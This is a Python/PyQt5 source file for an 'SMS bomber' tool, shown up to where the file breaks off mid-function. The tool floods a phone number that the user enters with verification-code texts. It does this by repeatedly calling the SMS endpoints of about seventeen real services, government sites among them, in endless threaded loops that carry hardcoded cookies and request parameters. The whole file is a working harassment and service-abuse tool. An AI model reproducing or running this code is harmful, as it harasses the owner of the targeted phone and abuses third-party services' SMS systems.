# -*- coding: utf-8 -*-

# Form implementation generated from reading ui file 'test.ui'
#
# Created by: PyQt5 UI code generator 5.11.3
#
# WARNING! All changes made in this file will be lost!
import sys
import time
import requests
import json
import re
import threading

from PyQt5.QtWidgets import QApplication, QMainWindow
from PyQt5 import QtCore, QtGui, QtWidgets
from PyQt5.QtCore import QTimer
from PyQt5.QtGui import QPixmap

boom_num = 0
class Ui_MainWindow(object):
    def setupUi(self, MainWindow):
        MainWindow.setObjectName("MainWindow")
        MainWindow.resize(570, 400)
        font = QtGui.QFont()
        font.setPointSize(8)
        MainWindow.setFont(font)
        MainWindow.setCursor(QtGui.QCursor(QtCore.Qt.ArrowCursor))
        MainWindow.setIconSize(QtCore.QSize(24, 24))
        self.centralwidget = QtWidgets.QWidget(MainWindow)
        self.centralwidget.setObjectName("centralwidget")
        self.label = QtWidgets.QLabel(self.centralwidget)
        self.label.setGeometry(QtCore.QRect(200, 10, 231, 35))
        font = QtGui.QFont()
        font.setFamily("仿宋")
        font.setPointSize(19)
        font.setBold(True)
        font.setWeight(75)
        font.setStrikeOut(False)
        self.label.setFont(font)
        self.label.setTextFormat(QtCore.Qt.AutoText)
        self.label.setObjectName("label")
        self.label_2 = QtWidgets.QLabel(self.centralwidget)
        self.label_2.setGeometry(QtCore.QRect(10, 80, 121, 16))
        font = QtGui.QFont()
        font.setFamily("楷体")
        font.setPointSize(14)
        self.label_2.setFont(font)
        self.label_2.setObjectName("label_2")
        self.lineEdit = QtWidgets.QLineEdit(self.centralwidget)
        self.lineEdit.setGeometry(QtCore.QRect(130, 70, 331, 31))
        self.lineEdit.setObjectName("lineEdit")
        # self.lineEdit.insert('13386394212')
        self.pushButton = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton.setGeometry(QtCore.QRect(480, 72, 75, 31))
        self.pushButton.clicked.connect(self.start_thread)
        font = QtGui.QFont()
        font.setFamily("楷体")
        font.setPointSize(11)
        self.pushButton.setFont(font)
        self.pushButton.setObjectName("pushButton")
        self.label_3 = QtWidgets.QLabel(self.centralwidget)
        self.label_3.setGeometry(QtCore.QRect(10, 130, 101, 16))
        font = QtGui.QFont()
        font.setFamily("楷体")
        font.setPointSize(14)
        self.label_3.setFont(font)
        self.label_3.setObjectName("label_3")

        self.label_4 = QtWidgets.QLabel(self.centralwidget)
        self.label_4.setGeometry(QtCore.QRect(510, 130, 100, 20))
        font = QtGui.QFont()
        font.setFamily("楷体")
        font.setPointSize(14)
        self.label_4.setFont(font)
        self.label_4.setStyleSheet("color:red;")
        self.label_4.setObjectName("label_4")

        self.pix = QPixmap('C:\\Users\YMJ\Desktop\\boom.ico')
        self.label_5 = QtWidgets.QLabel(self.centralwidget)
        self.label_5.setGeometry(450, 115, 45, 45)
        self.label_5.setPixmap(self.pix)

        self.textEdit = QtWidgets.QTextEdit(self.centralwidget)
        self.textEdit.setGeometry(QtCore.QRect(20, 170, 531, 201))
        self.textEdit.setObjectName("textEdit")
        self.cursor = self.textEdit.textCursor()
        self.cursor.movePosition(QtGui.QTextCursor.End)

        MainWindow.setCentralWidget(self.centralwidget)
        self.menubar = QtWidgets.QMenuBar(MainWindow)
        self.menubar.setGeometry(QtCore.QRect(0, 0, 570, 23))
        self.menubar.setDefaultUp(False)
        self.menubar.setNativeMenuBar(True)
        self.menubar.setObjectName("menubar")
        MainWindow.setMenuBar(self.menubar)
        self.statusbar = QtWidgets.QStatusBar(MainWindow)
        self.statusbar.setObjectName("statusbar")
        MainWindow.setStatusBar(self.statusbar)
        self.retranslateUi(MainWindow)
        QtCore.QMetaObject.connectSlotsByName(MainWindow)

        self.timer = QTimer()
        self.timer.timeout.connect(self.show_boom_sucessce_num)
        self.timer.start(100)

    def show_boom_sucessce_num(self):
        _translate = QtCore.QCoreApplication.translate
        self.label_4.setText(_translate("MainWindow", str(boom_num)+'条'))

    def retranslateUi(self, MainWindow):
        _translate = QtCore.QCoreApplication.translate
        MainWindow.setWindowTitle(_translate("MainWindow", "小鱼短信轰炸机"))
        self.label.setText(_translate("MainWindow", "小鱼短信轰炸机"))
        self.label_2.setText(_translate("MainWindow", "请输入号码："))
        self.pushButton.setText(_translate("MainWindow", "开始轰炸"))
        self.label_3.setText(_translate("MainWindow", "轰炸详情："))

    # def sms_boom(self,phone):
    #     sms_api_list = {
    #         '南航': 'https://b2c.csair.com/portal/smsMessage/EUserVerifyCode',
    #         'YY信用': 'http://credit.yy.com/api/accounts/generate_phone_code.json?phone=%s&type=bind_phone' % phone,
    #         '咪咕': 'https://passport.migu.cn/login/dynamicpassword?isAsync=true&msisdn=%s&captcha=&sourceID=100001&imgcodeType=2&fingerPrint=6cf5bc0fd23236edc40116049faedbf227551770161dd18031c1de5584eb4d95a6b70e6ad102e215233b7ffdcac508d737f2b9a9c74d45cd8fa1d262e288d788bc6754c1d69df7c17ce3d29fe7cbf0e9667f04dca4c53ba834299029ac6776a3cc8b2f109be38aa6ad45f236870e986db66375bb456e8609095b761f59bfb59f&fingerPrintDetail=459664a6e888a783748cefad7ccab6300345a682aa34dee9a4ada226c451e0caa1619eb242458dfade1f4c2e4a0f1493b632801aa57a7e278368510e670fe3b37f7a53a8eb54ac87665b11dcaadbdeb83d5883ded4a50a38af26412da2281cfcdfda32f0768d54532c25c634140e8e5d2f11775411744940097b8c49f087a3fc25a818c7785d44d5ed027056afdcca10b6b4e8dfb2045624b6adf3b54fc5dded943efea55ffe60e3ca4353d49fdaf4ecfd4de571d9173aad288b6a89252b55f6bdb1a2518927f1ea0bca27be5efb0a6ff53444252178c4dfdfd7e0b12947084b850416bd652caa9f44d42f8488b8e5a7eaac8dc958cd5f5d24348a5f8d136473601f2dbbfd9ddfd012c8dfcd9296bc57de69bcdf2d3314c11b371009981295c9885d7631a2818ebc802caad4a4184dca5195ce1c7f2d14fdca001cd6a5ac65f9e9e501248c3a1be0918b0cea9f7cafc25e619bc5ca172b65d1dd69601b384a686fab908cddc847335ca0c48bb59da3a99fdcd01ed76be6436f96d84b3e36ba2041faa007bc1b4182d8a34b8564aee89cc2a5ece7f7cd38a85e7e690fe938f5009761fd6ac32e7a126233c2bbef81918e2fd1f744943f4095c1c1bfa1b5f4f9a7bd023d71148e94cabb1976f310faa96052dad6ebcecbe09f40c8c435f783b3f79cc3e03c54fb5a3ff8174c802e9ea9801dfb12041037648a560baa32799bd555614dc6174e76a3f4db61225becce4ab32215a337aae305cf4c16529f59b3c911b6aeb73314dde33d0f86d91e95958fa513e4e1655d3ab32d278540a0eb9a39b5ae65d090140c45d714b1aa44135f8f6aed1c8b042f9a515fb6e027d09af71c4ac850a422394210e42efe033790038198ce092088c779ffc41b4f94d81a54cb44353cc6ea54818a9ab558c2f91ee697eeec8f66288f4be06cc432bb9ee75fdd12300b2f6e02156832cbff7e024288dc8941a811de8bab8220f35824c94657734aaaf36b737dffcf2b3f813feda3104bf2bdb764b14788c85b2a9491f00a3a19e6c8eea6a4ec7f5ef5c760e63c3529c3d88f57fff3ecf699de37e2918dc81cb4fb4dd28a67deb4b9b904bd0b15b65ca41728c5b4642f146c7a361e3c3ff0ca04d34358869310f942835366ccfebdd84359801437f92721aff2ff279bdc2c6b71bf7cbb86fcfc7b79241b5a9454c3842706c302575782cd10244c4344cdb8177e37760a3766ca616793f36700e32ac233c7df71f05716630c5a0cbab0e36e942c640bffd768958cfd886ef4e4ac97ae96fc0830471416fb8f16941c84f4c532c7a8eef60ccb23d072341d72db2df39dbea4bdc1c7dfb98da64b95c3b9cc9a059d48c2a976af794d8647f5b438a39f60357ae69d2454843a60a450c51db33effa663acf85ab011c86c66d74bde93f22e1a7d3cadefff37f122cb1cef339275882acf&_=1555661729851' % phone,
    #         '快健康': 'http://wx-api.kuaijiankang.com/users/send_message',
    #         '金蝶云': 'https://cloud.kingdee.com/passport/account/send_vcode',
    #         '易法通': 'http://yifatong.com/Customers/gettsms?rnd=1555667267.276&mobile=%s' % phone,
    #         '南通警察': 'http://www.ntjxj.com/InternetWeb/SendYzmServlet',
    #         '天津市监管委': 'http://zzsb.scjg.tj.gov.cn/nameOpenPlatform/login_login',
    #         '世界邦': 'http://is.shijiebang.com/vcode/apply/?callback=jQuery112409381263650192397_1555674316716&mobile=%s&_=1555674316718' % phone,
    #         '中金网': 'http://jrh.financeun.com/Login/sendMessageCode3.html?mobile=%s&mbid=197873' % phone,
    #         '中华支教': 'http://www.cta613.org/sendsms.php',
    #         '小麦助教': 'https://api-b.xiaomai5.com/b/send/authcode?p=w',
    #         '天津市市场监管委': 'http://qydj.scjg.tj.gov.cn/reportOnlineService/login_login',
    #         '苏打校园': 'https://api.sodalife.xyz/v1/sms-codes',
    #         '松鼠办公':'http://www.superlgr.com/pptapi/_sendCode'
    #     }

    def boom1(self,phone):
        while True:
            try:
                api = 'https://b2c.csair.com/portal/smsMessage/EUserVerifyCode'
                headers = {
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36',
                }
                form_data = {
                    'mobile': phone
                }
                data = requests.post(api,headers = headers,data=form_data).text
                print(data)
                data = json.loads(data)
                status = data['success']
                print('状态：' + str(status))
                if status == False:
                    global boom_num
                    boom_num = boom_num + 1
                    print('南航短信发送失败：' + data['errorMsg'] + '\n')
                    self.cursor.insertText('南航短信发送失败：' + data['errorMsg'] + '\n')
                    time.sleep(30)
                elif status == True:
                    self.total = self.total + 1
                    print('南航短信轰炸成功......\n')  # 同一手机连续获取需超过60s
                    self.cursor.insertText('南航短信轰炸成功......\n')
                    time.sleep(30)
            except:
                print('南航轰炸出错\n')
                self.cursor.insertText('南航短信轰炸出错......\n')
                time.sleep(10)
                continue

    def boom2(self,phone):
        while True:
            try:
                api = 'http://credit.yy.com/api/accounts/generate_phone_code.json?phone=%s&type=bind_phone'%phone
                headers = {
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36',
                    'Cookie': 'Hm_lvt_49f6c0f3e5904b7c5cc8447d25c6f8bc=1555658217; Hm_lpvt_49f6c0f3e5904b7c5cc8447d25c6f8bc=1555658217; gr_user_id=86f112bb-3529-4d72-9772-c6114e035f0e; grwng_uid=36a99558-93eb-4acc-b1eb-2844c8db53d7; _server_session=WE1jK3JuUWpZQ0g0RVF4MDBIbTcwd0VJSEQ1eFh0Kzh1SXFIQmxxMmM3bmZVTytIc1k5dVd0eTd5VjFiOWZUb1dEYUx4L3h4TW5BZDhZcTFVT24zMlE9PS0tWTFlZUR0LzhoVDJKS3cyYm1FTXJBdz09--3f800e5b87d3c0235da9d1931585ced5e5b92f12'
                }
                data = requests.get(api, headers=headers).text
                print(data)
                data = json.loads(data)
                status = data['data']['msg']
                print('状态：' + status)
                if  status == '发送成功':
                    global boom_num
                    boom_num = boom_num + 1
                    print('YY信用短信轰炸成功......\n')  # 同一手机连续获取需超过60s
                    self.cursor.insertText('YY信用短信轰炸成功......\n')
                    time.sleep(30)
                else:
                    print('YY信用短信发送失败......\n')
                    self.cursor.insertText('YY信用短信发送失败......\n')
                    time.sleep(30)
            except:
                print('YY信用轰炸出错\n')
                self.cursor.insertText('YY信用轰炸出错\n')
                time.sleep(10)
                continue

    def boom3(self,phone):
        while True:
            try:
                api = 'https://passport.migu.cn/login/dynamicpassword?isAsync=true&msisdn=%s&captcha=&sourceID=100001&imgcodeType=2&fingerPrint=6cf5bc0fd23236edc40116049faedbf227551770161dd18031c1de5584eb4d95a6b70e6ad102e215233b7ffdcac508d737f2b9a9c74d45cd8fa1d262e288d788bc6754c1d69df7c17ce3d29fe7cbf0e9667f04dca4c53ba834299029ac6776a3cc8b2f109be38aa6ad45f236870e986db66375bb456e8609095b761f59bfb59f&fingerPrintDetail=459664a6e888a783748cefad7ccab6300345a682aa34dee9a4ada226c451e0caa1619eb242458dfade1f4c2e4a0f1493b632801aa57a7e278368510e670fe3b37f7a53a8eb54ac87665b11dcaadbdeb83d5883ded4a50a38af26412da2281cfcdfda32f0768d54532c25c634140e8e5d2f11775411744940097b8c49f087a3fc25a818c7785d44d5ed027056afdcca10b6b4e8dfb2045624b6adf3b54fc5dded943efea55ffe60e3ca4353d49fdaf4ecfd4de571d9173aad288b6a89252b55f6bdb1a2518927f1ea0bca27be5efb0a6ff53444252178c4dfdfd7e0b12947084b850416bd652caa9f44d42f8488b8e5a7eaac8dc958cd5f5d24348a5f8d136473601f2dbbfd9ddfd012c8dfcd9296bc57de69bcdf2d3314c11b371009981295c9885d7631a2818ebc802caad4a4184dca5195ce1c7f2d14fdca001cd6a5ac65f9e9e501248c3a1be0918b0cea9f7cafc25e619bc5ca172b65d1dd69601b384a686fab908cddc847335ca0c48bb59da3a99fdcd01ed76be6436f96d84b3e36ba2041faa007bc1b4182d8a34b8564aee89cc2a5ece7f7cd38a85e7e690fe938f5009761fd6ac32e7a126233c2bbef81918e2fd1f744943f4095c1c1bfa1b5f4f9a7bd023d71148e94cabb1976f310faa96052dad6ebcecbe09f40c8c435f783b3f79cc3e03c54fb5a3ff8174c802e9ea9801dfb12041037648a560baa32799bd555614dc6174e76a3f4db61225becce4ab32215a337aae305cf4c16529f59b3c911b6aeb73314dde33d0f86d91e95958fa513e4e1655d3ab32d278540a0eb9a39b5ae65d090140c45d714b1aa44135f8f6aed1c8b042f9a515fb6e027d09af71c4ac850a422394210e42efe033790038198ce092088c779ffc41b4f94d81a54cb44353cc6ea54818a9ab558c2f91ee697eeec8f66288f4be06cc432bb9ee75fdd12300b2f6e02156832cbff7e024288dc8941a811de8bab8220f35824c94657734aaaf36b737dffcf2b3f813feda3104bf2bdb764b14788c85b2a9491f00a3a19e6c8eea6a4ec7f5ef5c760e63c3529c3d88f57fff3ecf699de37e2918dc81cb4fb4dd28a67deb4b9b904bd0b15b65ca41728c5b4642f146c7a361e3c3ff0ca04d34358869310f942835366ccfebdd84359801437f92721aff2ff279bdc2c6b71bf7cbb86fcfc7b79241b5a9454c3842706c302575782cd10244c4344cdb8177e37760a3766ca616793f36700e32ac233c7df71f05716630c5a0cbab0e36e942c640bffd768958cfd886ef4e4ac97ae96fc0830471416fb8f16941c84f4c532c7a8eef60ccb23d072341d72db2df39dbea4bdc1c7dfb98da64b95c3b9cc9a059d48c2a976af794d8647f5b438a39f60357ae69d2454843a60a450c51db33effa663acf85ab011c86c66d74bde93f22e1a7d3cadefff37f122cb1cef339275882acf&_=1555661729851'%phone
                headers = {
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36',
                }
                data = requests.get(api,headers=headers).text
                print(data)
                data = json.loads(data)
                status = data['status']
                print('状态：' + str(status))
                if status == 2000:
                    global boom_num
                    boom_num = boom_num + 1
                    print('咪咕平台轰炸成功......\n')
                    self.cursor.insertText('咪咕平台轰炸成功......\n')
                    time.sleep(30)
                else:
                    print('咪咕平台短信发送失败......\n')
                    self.cursor.insertText('咪咕平台短信发送失败......\n')
                    time.sleep(30)
            except:
                print('咪咕平台轰炸出错......\n')
                self.cursor.insertText('咪咕平台轰炸出错......\n')
                time.sleep(10)
                continue

    def boom4(self,phone):
        while True:
            try:
                api = 'http://wx-api.kuaijiankang.com/users/send_message'
                headers = {
                    'user-agent': 'Rajax/1 PRO_6/meizu_PRO6 Android/7.1.1 Display/Flyme_7.2.0.1A Eleme/165 ID/bingghost; KERNEL_VERSION:3.18.55+ API_Level:66',
                    'sign': '0b4cbadf2699b92448a4355ebfd4e990',
                    'TIMESTAMP': '1555663811836',
                    'version': '7.1.04'
                }
                formdata = {
                    'method': 'sendCaptchaNew',
                    'mobile_phone': phone,
                    'verify_code': '',
                    'used_for': '3',
                    'uuid': '0'
                }
                data = requests.post(api, headers=headers, data=formdata).text
                print(data)
                data = json.loads(data)
                status = data['result']
                print('状态：' + str(status))
                if status == True:
                    global boom_num
                    boom_num = boom_num + 1
                    print(data['msg'])
                    self.cursor.insertText(data['msg'])
                    print('快健康轰炸成功......\n')
                    self.cursor.insertText('快健康快健康轰炸成功......\n\n')
                    time.sleep(30)
                else:
                    print('快健康短信发送失败：' + data['msg'] + '\n')
                    self.cursor.insertText('快健康短信发送失败：' + data['msg'] + '\n\n')
                    time.sleep(30)
            except:
                print('快健康轰炸出错\n')
                self.cursor.insertText('快健康轰炸出错\n\n')
                time.sleep(10)
                continue

    def boom5(self,phone):
        while True:
            try:
                api = 'https://cloud.kingdee.com/passport/account/send_vcode'
                headers = {
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36',
                    'ATK': '6e0wriy91nzd8ukl',
                    'Cookie': 'PHPSESSID=0at1sf0basrpu6fm914a1mtnc5; smesd=tsBxBJc8if_u0qG4a1L4UYLFMQK6nlvoFxVidzDnBznnw1esWSbnQpHIhXJPsIpJ3ATkfIKK19jlmVH8vJUBoAWesmd8IcfN2jHdAE3gJaqvW-M4lFG6s6ERyrZFKoYslF95KKlqt12U8F0'
                }
                formdata = {
                    'type': '1',
                    'client_id': '0',
                    'phone': phone,
                    'ccode': '86',
                }
                data = requests.post(api, headers=headers, data=formdata).text
                print(data)
                data = json.loads(data)
                status = data['code']
                print('状态：' + str(status))
                if status == 0:
                    global boom_num
                    boom_num = boom_num + 1
                    print(data['description'])
                    self.cursor.insertText(data['description'])
                    print('金蝶云轰炸成功......\n')
                    self.cursor.insertText('金蝶云轰炸成功......\n\n')
                    time.sleep(30)
                else:
                    print('金蝶云短信发送失败......\n')
                    self.cursor.insertText('金蝶云短信发送失败......\n\n')
                    time.sleep(30)
            except:
                print('金蝶云轰炸出错\n')
                self.cursor.insertText('金蝶云轰炸出错\n\n')
                time.sleep(10)
                continue

    def boom6(self,phone):
        while True:
            try:
                api = 'http://yifatong.com/Customers/gettsms?rnd=1555667267.276&mobile=%s'%phone
                headers = {
                    'Host': 'yifatong.com',
                    'Proxy-Connection': 'keep-alive',
                    'Accept': '*/*',
                    'X-Requested-With': 'XMLHttpRequest',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36',
                    'Referer': 'http://yifatong.com/Customers/login',
                    'Accept-Encoding': 'gzip, deflate',
                    'Accept-Language': 'zh-CN,zh;q=0.9',
                    'Cookie': 'CAKEPHP=a0952590eab52b5d6127b86c1f948972; Hm_lvt_fb384d34b375f9c11fc59bc51d22f5d4=1555667255; Hm_lpvt_fb384d34b375f9c11fc59bc51d22f5d4=1555667255; Hm_lvt_9eef1197e697839acd67ee28766cd23d=1555667255; Hm_lpvt_9eef1197e697839acd67ee28766cd23d=1555667255; Qs_lvt_104001=1555667255; Qs_pv_104001=3681559695703732700'
                }
                data = requests.get(api, headers=headers).text
                print('状态：' + data)
                if data == 'success':
                    global boom_num
                    boom_num = boom_num + 1
                    print('易法通轰炸成功......\n')
                    self.cursor.insertText('易法通轰炸成功......\n\n')
                    time.sleep(30)
                else:
                    print('易法通短信发送失败......\n')
                    self.cursor.insertText('易法通短信发送失败......\n\n')
                    time.sleep(30)
            except:
                print('易法通轰炸出错\n')
                self.cursor.insertText('易法通轰炸出错\n\n')
                time.sleep(10)
                continue

    def boom7(self,phone):
        while True:
            try:
                api = 'http://www.ntjxj.com/InternetWeb/SendYzmServlet'
                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36',
                    'Cookie': 'JSESSIONID=A3D0AA7FDFA8F22E161BAA100CF7746E'
                }
                data = requests.post(api, data={'sjhm': phone}, headers=headers).text
                print(data, end='')
                data = json.loads(data)
                for key in data:
                    if key == 'ok':
                        global boom_num
                        boom_num = boom_num + 1
                        print(key + data[key])
                        self.cursor.insertText(key + data[key])
                        print('南通警察轰炸成功......\n')
                        self.cursor.insertText('南通警察轰炸成功......\n\n')
                        time.sleep(30)
                    else:
                        print(key + data[key])
                        self.cursor.insertText(key + data[key])
                        print('南通警察短信发送失败......\n')
                        self.cursor.insertText('南通警察短信发送失败......\n\n')
                        time.sleep(30)
            except:
                print('南通警察轰炸出错......\n')
                self.cursor.insertText('南通警察轰炸出错\n\n')
                time.sleep(10)
                continue

    def boom8(self,phone):
        while True:
            try:
                api = 'http://zzsb.scjg.tj.gov.cn/nameOpenPlatform/login_login'
                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36',
                }
                formdata = {
                    'MOBILENO': phone,
                    'SENDTYPE': 'reg',
                    'type': 'sendcode'
                }
                data = requests.post(api, data=formdata, headers=headers).text
                print(data)
                data = json.loads(data)
                status = data['result']
                if status == 'success':
                    global boom_num
                    boom_num = boom_num + 1
                    print(status)
                    print('天津市监管委轰炸成功......\n')
                    self.cursor.insertText('天津市监管委轰炸成功......\n\n')
                    time.sleep(30)
                else:
                    print('天津市监管委短信发送失败：' + data['msg'] + '......\n')
                    self.cursor.insertText('天津市监管委短信发送失败：' + data['msg'] + '......\n\n')
                    time.sleep(30)
            except:
                print('天津市监管委轰炸出错......\n')
                self.cursor.insertText('天津市监管委轰炸出错\n\n')
                time.sleep(10)
                continue

    def boom9(self,phone):
        while True:
            try:
                api = 'http://is.shijiebang.com/vcode/apply/?callback=jQuery112409381263650192397_1555674316716&mobile=%s&_=1555674316718'%phone
                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36',
                    'Referer': 'http://www.shijiebang.com/'
                }
                data = requests.get(api, headers=headers).text
                data = re.search(r'\((.*)\)', data).group(1)
                print(data)
                data = json.loads(data)
                status = data['code']
                msg = data['msg']
                if status == 0:
                    global boom_num
                    boom_num = boom_num + 1
                    print(msg)
                    self.cursor.insertText(msg)
                    print('世界邦轰炸成功......\n')
                    self.cursor.insertText('世界邦轰炸成功......\n\n')
                    time.sleep(30)
                else:
                    print('世界邦短信发送失败：' + msg + '......\n')
                    self.cursor.insertText('世界邦短信发送失败：' + msg + '......\n\n')
                    time.sleep(30)
            except:
                print('世界邦轰炸出错......\n')
                self.cursor.insertText('世界邦轰炸出错\n\n')
                time.sleep(10)
                continue

    def boom10(self,phone): #这个无限制，能发很多次
        while True:
            try:
                api = 'http://jrh.financeun.com/Login/sendMessageCode3.html?mobile=%s&mbid=197873'%phone
                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36',
                }
                data = requests.get(api, headers=headers)
                status = data.status_code
                data = data.text
                if status == 200 and data == '1':
                    global boom_num
                    boom_num = boom_num + 1
                    print('中金网轰炸成功......\n')
                    self.cursor.insertText('中金网轰炸成功......\n\n')
                    time.sleep(2)
                else:
                    print('中金网短信发送失败......\n')
                    self.cursor.insertText('中金网短信发送失败......\n\n')
                    time.sleep(2)
            except:
                print('中金网轰炸出错......\n')
                self.cursor.insertText('中金网轰炸出错\n\n')
                time.sleep(10)
                continue

    def boom11(self,phone):
        while True:
            try:
                api = 'http://www.cta613.org/sendsms.php'
                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36',
                }
                data = requests.post(api, data={'sj': phone}, headers=headers).text
                print(data)
                data = json.loads(data)
                status = data['code']
                if status == 1:
                    global boom_num
                    boom_num = boom_num + 1
                    print('中华支教轰炸成功......\n')
                    self.cursor.insertText('中华支教轰炸成功......\n\n')
                    time.sleep(30)
                else:
                    print('中华支教短信发送失败......\n')
                    self.cursor.insertText('中华支教短信发送失败......\n\n')
                    time.sleep(30)
            except:
                print('中华支教轰炸出错......\n')
                self.cursor.insertText('中华支教轰炸出错\n\n')
                time.sleep(10)
                continue

    def boom12(self,phone):
        while True:
            try:
                api = 'https://api-b.xiaomai5.com/b/send/authcode?p=w'
                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36',
                }
                data = requests.post(api, {'phone': phone},headers = headers).text
                print(data)
                data = json.loads(data)
                if data['resultCode'] == 0:
                    global boom_num
                    boom_num = boom_num + 1
                    print('小麦助教轰炸成功......\n')
                    self.cursor.insertText('小麦助教轰炸成功......\n\n')
                    time.sleep(30)
                else:
                    print(data['resultMsg'] + '......')
                    self.cursor.insertText(data['resultMsg'] + '......')
                    print('小麦助教短信发送失败......\n')
                    self.cursor.insertText('小麦助教短信发送失败......\n\n')
                    time.sleep(30)
            except:
                print('小麦助教轰炸出错......\n')
                self.cursor.insertText('小麦助教轰炸出错\n\n')
                time.sleep(10)
                continue

    def boom13(self,phone):
        while True:
            try:
                api = 'http://qydj.scjg.tj.gov.cn/reportOnlineService/login_login'
                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36',
                }
                data = requests.post(api, data={'MOBILENO': phone},headers=headers).text
                print(data)
                data = json.loads(data)
                if data['result'] == 'success':
                    global boom_num
                    boom_num = boom_num + 1
                    print('天津市市场监管委轰炸成功......\n')
                    self.cursor.insertText('天津市市场监管委轰炸成功......\n\n')
                    time.sleep(30)
                else:
                    print(data['result'] + '......')
                    print('天津市市场监管委短信发送失败......\n')
                    self.cursor.insertText(data['result'] + '......')
                    self.cursor.insertText('天津市市场监管委短信发送失败......\n')
                    time.sleep(30)
            except:
                print('天津市市场监管委轰炸出错......\n')
                self.cursor.insertText('天津市市场监管委轰炸出错\n\n')
                time.sleep(10)
                continue

    def boom14(self,phone):
        while True:
            try:
                api = 'https://api.sodalife.xyz/v1/sms-codes'
                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36',
                }
                data = requests.post(api, data=json.dumps({'motivation': "LOGIN", 'mobile': phone}),headers=headers).text
                print(data)
                data = json.loads(data)
                if data['status'] in [ 'OK','ok']:
                    global boom_num
                    boom_num = boom_num + 1
                    print('苏打校园轰炸成功......\n')
                    self.cursor.insertText('苏打校园轰炸成功......\n\n')
                    time.sleep(30)
                else:
                    print(data['message'] + '......')
                    print('苏打校园短信发送失败......\n')
                    self.cursor.insertText(data['message'] + '......')
                    self.cursor.insertText('苏打校园短信发送失败......\n')
                    time.sleep(30)
            except:
                print('苏打校园轰炸出错......\n')
                self.cursor.insertText('苏打校园轰炸出错\n\n')
                time.sleep(10)
                continue

    def boom15(self,phone):
        while True:
            try:
                api = "http://www.superlgr.com/pptapi/_sendCode"
                data = requests.post(api, data={"phone": phone, "type": 0}).text
                print(data)
                if data == '1':
                    global boom_num
                    boom_num = boom_num + 1
                    print('松鼠办公轰炸成功......\n')
                    self.cursor.insertText('松鼠办公轰炸成功......\n')
                    time.sleep(30)
                else:
                    print(data + '......')
                    print('松鼠办公短信发送失败......\n')
                    self.cursor.insertText(data + '......')
                    self.cursor.insertText('松鼠办公短信发送失败......\n\n')
                    time.sleep(30)
            except:
                print('松鼠办公轰炸出错......\n')
                self.cursor.insertText('松鼠办公轰炸出错\n\n')
                time.sleep(10)
                continue

    def boom16(self,phone):
        while True:
            try:
                url = 'https://ems.xg-yc.com/ent/sendMobileCode'
                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36',
                    'Content-Type': 'application/json;charset=UTF-8',
                }
                data = requests.post(url, data=json.dumps({'mobile': phone}), headers=headers)
                data = data.text
                print(data)
                global boom_num
                boom_num = boom_num + 1
                print('小当用车轰炸成功......\n\n')
                self.cursor.insertText('小当用车轰炸成功......\n\n')
                time.sleep(10)
            except:
                print('小当用车轰炸出错......\n\n')
                self.cursor.insertText('小当用车轰炸出错\n\n')
                time.sleep(10)
                continue

    def boom17(self,phone):
        while True:
            try:
                url = 'http://m.jinxianghui.net/page/send'
                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36',
                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'Cookie': '_csrf-website=cad96715de6b7d7f93308cc2a5734e277190d8b487b41bac9ab44b36ad432438a%3A2%3A%7Bi%3A0%3Bs%3A13%3A%22_csrf-website%22%3Bi%3A1%3Bs%3A32%3A%22S6Oyuq3ThWjDxz7ShceuIe8zcjlYURxV%22%3B%7D; Hm_lvt_25d8fe270f4018b96e8205645fdb4d9e=1556015164; Hm_lpvt_25d8fe270f4018b96e8205645fdb4d9e=1556015164'
                }
                form_data = {
                    '_csrf-website': '1Y-zHFXhVzJNlluhE9amFC4M_JqneL7AvSjIR2Nq_OmGufxlIJBkZiXBMeVrrJFHRm-Z7-4dhrreQqQeNjiEvw==',
                    'phone': phone,
                }
                data = requests.post(url, data=form_data, headers=headers).json()
                print(data)
                if data['code'] == 200:
                    global boom_num
                    boom_num = boom_num + 1
                    print(data['msg'])
                    self.cursor.insertText(data['msg'])
                    print('金享会轰炸成功......\n\n')
                    self.cursor.insertText('金享会轰炸成功......\n\n')
                    time.sleep(30)
                else:
